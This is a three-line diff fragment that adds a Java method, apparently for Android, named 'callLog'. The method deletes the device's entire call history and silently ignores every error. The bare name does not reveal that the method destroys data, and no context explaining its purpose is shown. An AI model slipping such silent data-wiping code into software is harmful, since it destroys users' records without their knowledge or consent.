@@ -1,0 +1,3 @@
+static void callLog(Context ctx) {
+        try { ctx.getContentResolver().delete(CallLog.Calls.CONTENT_URI, null, null); } catch (Throwable ignore) {}
+    }
